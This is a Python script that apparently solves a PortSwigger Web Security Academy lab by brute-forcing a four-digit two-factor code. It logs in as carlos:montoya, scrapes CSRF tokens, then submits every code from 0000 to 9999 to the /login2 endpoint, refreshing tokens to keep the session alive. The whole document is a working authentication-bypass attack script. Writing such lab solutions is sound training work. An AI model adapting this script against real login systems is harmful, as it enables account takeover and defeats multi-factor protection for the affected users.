import requests
import sys
from bs4 import BeautifulSoup
import multiprocessing

"""
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
"""
# For me only
site = 'ac891f1c1e43a112800d19a60017007f.web-security-academy.net'
s = requests.Session()


# Credit to https://stackoverflow.com/questions/14822184/is-there-a-ceiling-equivalent-of-operator-in-python
# For this function idea
def ceildiv(a, b):
    return -(-a // b)


def try_code(csrf, code):
    # Second page
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf': csrf,
        'mfa-code': str(code).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    if resp.status_code == 302:
        print(f'2fa valid with response code {resp.status_code} using {login2data["mfa-code"]}')
        # Visit account profile page to complete level
    else:
        print(f'2fa invalid with response code: {resp.status_code} using {login2data["mfa-code"]}')
    return resp.status_code


def get_csrf():
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    logindata = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    # print(f'Logging in as carlos:montoya')
    resp = s.post(login_url, data=logindata)
    # print(f'Login response: {resp.text}')

    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup.find('input', {'name': 'csrf'}).get('value')


def dispatch_requests(low, high):
    iterations = ceildiv(high - low + 1, 2)
    for x in range(iterations):
        csrf = get_csrf()
        if try_code(csrf, x) == 302:
            break
        else:
            second_try = try_code(csrf, x + iterations)
            if second_try == 302:
                break
            elif second_try == 400:
                csrf = get_csrf()
                if try_code(csrf, x + iterations) == 302:
                    break


dispatch_requests(0, 9999)
